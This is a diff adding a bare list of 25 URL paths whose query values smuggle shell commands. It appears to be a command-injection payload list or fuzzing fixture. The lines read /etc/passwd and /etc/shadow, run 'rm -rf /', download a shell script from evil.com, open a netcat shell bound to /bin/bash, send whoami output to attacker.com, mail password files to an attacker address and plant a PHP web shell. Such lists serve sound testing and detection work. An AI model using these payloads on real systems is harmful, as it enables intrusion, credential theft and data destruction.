@@ -1,0 +1,25 @@
+/api/ping?host=8.8.8.8;ls -la /
+/tools/dns-lookup?domain=example.com | cat /etc/passwd
+/admin/exec?cmd=whoami
+/service/restart?name=apache && rm -rf /
+/api/v1/utils/traceroute?host=google.com; id
+/dev/diag?ip=127.0.0.1; echo "hacked" > /var/www/html/index.html
+/tools/net/ping?ip=`reboot`
+/api/convert?file=doc.txt&format=pdf; wget http://evil.com/shell.sh -O /tmp/shell.sh
+/cgi-bin/status?host=localhost | nc -l -p 1337 -e /bin/bash
+/user/avatar/upload?url=http://example.com/pic.jpg; chmod +x /tmp/shell.sh
+/system/run?command=uname -a
+/api/v2/network_test?addr=1.1.1.1; ps aux
+/debug/info?module=net; cat /etc/shadow
+/tools/whois?query=google.com | base64 /etc/hosts
+/admin/backup?file=all; curl http://attacker.com/log?data=$(whoami)
+/api/export?format=csv; find / -name "*.bak"
+/service/printer/print?doc_id=123; lp -d evil_printer /etc/passwd
+/cgi-bin/test.sh?arg1=hello; /tmp/shell.sh
+/api/v1/system?info=uptime; head -n 1 /etc/passwd
+/tools/nmap?host=localhost; echo '<?php system($_GET["cmd"]); ?>' > shell.php
+/admin/module/install?url=http://legit.com/m.zip; unzip shell.zip -d /var/www/
+/api/image/resize?path=/img/logo.png; rm /img/logo.png
+/debug/run_query?query=users; sleep 10
+/service/mailer?to=a@b.com; mail attacker@evil.com < /etc/passwd
+/api/git/clone?repo=https://github.com/a/b.git; git checkout -f
